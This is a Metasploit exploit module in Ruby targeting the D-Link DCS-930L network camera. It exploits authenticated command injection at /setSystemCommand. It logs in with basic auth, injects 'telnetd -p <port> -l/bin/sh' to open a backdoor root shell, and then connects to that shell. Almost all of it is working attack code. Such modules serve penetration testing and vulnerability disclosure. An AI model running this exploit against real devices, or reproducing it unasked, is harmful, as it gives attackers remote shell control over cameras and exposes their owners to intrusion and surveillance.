## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
  include Msf::Exploit::Remote::Telnet
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;D-Link DCS-930L Authenticated Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        The D-Link DCS-930L Network Video Camera is vulnerable
        to OS Command Injection via the web interface.  The vulnerability
        exists at /setSystemCommand, which is accessible with credentials.
        by 2.12.
      },
      &#039;Author&#039;      =>
        [
          &#039;Nicholas Starke <nick@alephvoid.com>&#039;
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;DisclosureDate&#039;  => &#039;Dec 20 2015&#039;,
      &#039;Privileged&#039;      => true,
      &#039;Platform&#039;        => &#039;unix&#039;,
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Payload&#039;         =>
        {
          &#039;Compat&#039;  => {
          &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
          &#039;ConnectionType&#039; => &#039;find&#039;,
          },
        },
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/interact&#039; },
      &#039;Targets&#039;        =>
        [
          [  &#039;Automatic&#039;,     { } ],
        ],
      &#039;DefaultTarget&#039;  => 0
     ))
 
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;User to login with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password to login with&#039;, &#039;&#039;])
      ], self.class)
 
    register_advanced_options(
      [
        OptInt.new(&#039;TelnetTimeout&#039;, [ true, &#039;The number of seconds to wait for a reply from a Telnet Command&#039;, 10]),
        OptInt.new(&#039;TelnetBannerTimeout&#039;, [ true, &#039;The number of seconds to wait for the initial banner&#039;, 25])
      ], self.class)
  end
 
  def telnet_timeout
    (datastore[&#039;TelnetTimeout&#039;] || 10)
  end
 
  def banner_timeout
    (datastore[&#039;TelnetBannerTimeout&#039;] || 25)
  end
 
  def exploit
    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;] || &#039;&#039;
 
    test_login(user, pass)
    exploit_telnet
  end
 
  def test_login(user, pass)
    print_status("#{peer} - Trying to login with #{user} : #{pass}")
 
    res = send_request_cgi({
      &#039;uri&#039; => &#039;/&#039;,
      &#039;method&#039; => &#039;GET&#039;,
      &#039;authorization&#039; => basic_auth(user, pass)
    })
 
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - invalid credentials (response code: #{res.code}") if res.code != 200
 
    print_good("#{peer} - Successful login #{user} : #{pass}")
  end
 
  def exploit_telnet
    telnet_port = rand(32767) + 32768
 
    print_status("#{peer} - Telnet Port: #{telnet_port}")
 
    cmd = "telnetd -p #{telnet_port} -l/bin/sh"
 
    telnet_request(cmd)
 
    print_status("#{rhost}:#{telnet_port} - Trying to establish telnet connection...")
    ctx = { &#039;Msf&#039; => framework, &#039;MsfExploit&#039; => self }
    sock = Rex::Socket.create_tcp({ &#039;PeerHost&#039; => rhost, &#039;PeerPort&#039; => telnet_port, &#039;Context&#039; => ctx, &#039;Timeout&#039; => telnet_timeout })
 
    if sock.nil?
      fail_with(Failure::Unreachable, "#{rhost}:#{telnet_port} - Backdoor service unreachable")
    end
 
    add_socket(sock)
 
    print_status("#{rhost}:#{telnet_port} - Trying to establish a telnet session...")
    prompt = negotiate_telnet(sock)
 
    if prompt.nil?
      sock.close
      fail_with(Failure::Unknown, "#{rhost}:#{telnet_port} - Unable to establish a telnet session")
    else
      print_good("#{rhost}:#{telnet_port} - Telnet session successfully established")
    end
 
    handler(sock)
  end
 
  def telnet_request(cmd)
    uri = &#039;/setSystemCommand&#039;
 
    begin
      res = send_request_cgi({
        &#039;uri&#039; => uri,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => {
          &#039;ReplySuccessPage&#039; => &#039;docmd.htm&#039;,
          &#039;ReplyErrorPage&#039; => &#039;docmd.htm&#039;,
          &#039;SystemCommand&#039;  => cmd,
          &#039;ConfigSystemCommand&#039; => &#039;Save&#039;
        }
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
 
  def negotiate_telnet(sock)
    begin
      Timeout.timeout(banner_timeout) do
        while(true)
          data = sock.get_once(-1, telnet_timeout)
          return nil if not data or data.length == 0
          if data =~ /BusyBox/
            return true
          end
        end
      end
    rescue ::Timeout::Error
      return nil
    end
  end
end

